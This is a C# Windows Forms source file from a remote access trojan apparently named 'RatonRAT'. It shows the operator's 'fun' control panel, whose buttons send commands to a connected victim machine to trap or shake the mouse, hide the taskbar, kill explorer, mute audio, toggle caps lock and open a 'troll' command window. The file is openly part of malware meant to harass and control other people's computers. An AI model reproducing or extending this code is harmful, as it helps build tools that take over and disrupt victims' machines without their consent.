using System;
using Server.Connection;
using Stuff;
using System.Windows.Forms;
using System.Drawing.Drawing2D;
using System.Drawing;
using System.Linq;

namespace RatonRAT.ClientForms
{
    //MESSY CODE WARNING
    public partial class FormFun : Form
    {
        public SillyClient SillyClient { get; set; }

        private bool isMouseDown = false;

        private Point mouseOffset;

        private void FormFun_MouseDown(object sender, MouseEventArgs e)
        {
            isMouseDown = true;
            mouseOffset = new Point(e.X, e.Y);
        }

        private void FormFun_MouseMove(object sender, MouseEventArgs e)
        {
            if (isMouseDown)
            {
                this.Location = new Point(this.Left + e.X - mouseOffset.X, this.Top + e.Y - mouseOffset.Y);
            }
        }

        private void FormFun_MouseUp(object sender, MouseEventArgs e)
        {
            isMouseDown = false;
        }

        public FormFun()
        {
            InitializeComponent();
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
            timer1.Start();
            this.MouseDown += FormFun_MouseDown;
            this.MouseMove += FormFun_MouseMove;
            this.MouseUp += FormFun_MouseUp;
        }

        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }


        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void button19_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (SillyClient == null || !SillyClient.isConnected())
            {
                this.Close();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "Beep");
            SillyClient.Send(pack.Pacc());
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "Caps");
            SillyClient.Send(pack.Pacc());
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "TrapMouse");
            SillyClient.Send(pack.Pacc());
        }

        private void button6_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "UntrapMouse");
            SillyClient.Send(pack.Pacc());
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "ShakeMouse");
            SillyClient.Send(pack.Pacc());
        }

        private void button7_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "ShakeMouseStop");
            SillyClient.Send(pack.Pacc());
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "HideTaskbar");
            SillyClient.Send(pack.Pacc());
        }

        private void button8_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "ShowTaskbar");
            SillyClient.Send(pack.Pacc());
        }

        private void button9_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "killexplorer");
            SillyClient.Send(pack.Pacc());
        }

        private void button10_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "startexplorer");
            SillyClient.Send(pack.Pacc());
        }

        private void button12_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "Mute");
            SillyClient.Send(pack.Pacc());
        }

        private void button11_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "Trollcmd");
            SillyClient.Send(pack.Pacc());
        }

        private void FormFun_Load(object sender, EventArgs e)
        {
            new RatonRAT.Classes.LightMode().Apply(this);
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));

            for (int i = 1; i <= 19; i++)
            {
                Control btn = this.Controls.Find("button" + i, true).FirstOrDefault();
                if (btn != null)
                    btn.Region = new Region(CreateRoundPath(btn.ClientRectangle, 15));
            }
            this.Paint += Form_Paint;
        }
// to lazy for this shit...

        private void Form_Paint(object sender, PaintEventArgs e)
        {
            if (!this.DesignMode)
            {
                using (Pen pen = new Pen(Color.White, 3))
                {
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
                    e.Graphics.DrawPath(pen, CreateRoundPath(this.ClientRectangle, 25));
                }
            }
        }
    }
}
